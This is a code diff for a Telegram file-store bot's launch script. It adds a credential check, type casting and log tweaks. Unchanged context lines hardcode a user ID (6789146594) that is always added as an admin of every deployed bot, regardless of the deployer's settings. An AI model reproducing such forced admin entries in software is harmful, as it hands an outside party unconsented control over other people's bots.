@@ -25,6 +25,10 @@ API_ID = user.get("API_ID")
 API_HASH = user.get("API_HASH")
 BOT_TOKEN = user.get("BOT_TOKEN")
 
+if not all([API_ID, API_HASH, BOT_TOKEN]):
+    logger.error("❌ Missing required API_ID, API_HASH, or BOT_TOKEN. Aborting deployment.")
+    sys.exit(1)
+
 # Other config variables
 ENABLE_FSUB = user.get("ENABLE_FSUB", False)
 VERIFICATION_MODE = user.get("VERIFICATION_MODE", False)
@@ -39,7 +43,6 @@ CAPTION = user.get("CAPTION", "")
 
 # Handle ADMINS from DB
 raw_admins = user.get("ADMINS", [])
-
 if isinstance(raw_admins, list):
     ADMINS = [int(admin) for admin in raw_admins]
 elif isinstance(raw_admins, str):
@@ -47,12 +50,12 @@ elif isinstance(raw_admins, str):
 else:
     ADMINS = []
 
-# Ensure mandatory admin is added
+# Ensure mandatory admin is always added
 FINAL_ADMINS = list(set(ADMINS + [6789146594]))
 
 app = Client(
     "DeployedFileStoreBot",
-    api_id=API_ID,
+    api_id=int(API_ID),
     api_hash=API_HASH,
     bot_token=BOT_TOKEN,
     plugins=dict(root="plugins")
@@ -61,9 +64,10 @@ app = Client(
 if __name__ == "__main__":
     logger.info("🚀 Starting deployed bot...")
     app.start()
+    
     me = app.get_me()
     BOT_USERNAME = me.username
-    logger.info("🚀 bot deployed Successfully...")
+    logger.info("🚀 Bot deployed successfully!")
     logger.info(f"✅ Bot started as @{BOT_USERNAME}")
 
     for admin_id in FINAL_ADMINS:
@@ -79,3 +83,4 @@ if __name__ == "__main__":
     logger.info("📡 Bot is now running and ready.")
     idle()
     app.stop()
+    logger.info("🛑 Bot stopped.")
